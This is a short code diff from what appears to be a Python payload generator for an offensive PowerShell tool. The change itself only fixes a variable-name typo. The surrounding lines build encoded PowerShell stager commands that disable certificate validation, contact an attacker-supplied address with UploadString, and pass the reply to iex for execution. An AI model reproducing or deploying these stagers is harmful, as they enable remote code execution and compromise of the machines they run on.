@@ -94,7 +94,7 @@ Once the payload has been generated, either copy and paste the commands into a s
             messageblock="[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex(New-Object Net.Webclient).UploadString('https://%s', \"{ 'UUID':'%s', 'key':'%s', 'event' : 'req' }\")" % (address,UUID,key)
             encodedmessage = b64encode(messageblock.encode('UTF-16LE')).decode('UTF-8')
             messageblock="\"powershell -e %s \"" % (encodedmessage)
-        elif use+ssl=="no":   
+        elif use_ssl=="no":   
             messageblock="\"powershell -command `\"iex(New-Object Net.Webclient).UploadString('http://%s', \`\"{ 'UUID':'%s', 'key':'%s', 'event' : 'req' }\`\")`\"\"" % (address,UUID,key)
         else:
             print "use_ssl must be either 'yes' or 'no'"
